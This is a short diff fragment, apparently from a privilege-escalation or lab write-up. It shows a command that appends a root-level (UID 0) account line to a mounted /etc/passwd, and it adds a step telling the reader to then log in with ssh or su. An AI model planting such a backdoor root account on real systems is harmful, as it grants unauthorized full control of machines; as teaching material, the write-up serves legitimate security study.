@@ -123,4 +123,4 @@
 
       echo '[usernameyou want]:[openssl generated hash]:0:0:root:/root:/bin/bash' >> /mnt/root/etc/passwd` 
   
-  
+- You have successfully created a user on the attack machine,after that you can ssh to the user or use `su user` 
